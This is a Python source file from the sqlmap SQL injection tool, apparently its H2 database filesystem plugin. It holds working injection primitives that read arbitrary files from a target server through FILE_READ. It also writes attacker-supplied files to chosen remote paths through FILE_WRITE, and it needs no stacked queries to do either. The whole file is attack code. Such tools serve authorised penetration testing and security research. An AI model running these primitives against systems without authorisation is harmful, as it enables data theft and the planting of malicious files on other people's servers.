#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import checkFile
from lib.core.convert import getText
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.request import inject
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def nonStackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "fetching file: '%s'" % remoteFile
            logger.info(infoMsg)

        # NOTE: FILE_READ() is a default H2 builtin and works in a plain SELECT (no stacking required)
        result = inject.getValue("RAWTOHEX(FILE_READ('%s'))" % remoteFile, charsetType=CHARSET_TYPE.HEXADECIMAL)

        return result

    def stackedReadFile(self, remoteFile):
        # H2 reads through a builtin scalar, so the stacked/direct path reuses the same primitive
        return self.nonStackedReadFile(remoteFile)

    def writeFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
        checkFile(localFile)
        self.checkDbmsOs()

        with open(localFile, "rb") as f:
            content = getText(f.read())

        infoMsg = "writing the file content to '%s'" % remoteFile
        logger.info(infoMsg)

        # NOTE: FILE_WRITE() is the H2 builtin counterpart of FILE_READ(); being a plain scalar it needs no
        # stacked queries (the write happens as a side effect over UNION/error/blind). The content is passed
        # as a string literal (STRINGTOUTF8) so it survives sqlmap's CHAR()-encoding (unlike an X'..' literal)
        inject.getValue("CAST(FILE_WRITE(STRINGTOUTF8('%s'),'%s') AS INT)" % (content.replace("'", "''"), remoteFile), expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

        return self.askCheckWrittenFile(localFile, remoteFile, forceCheck)
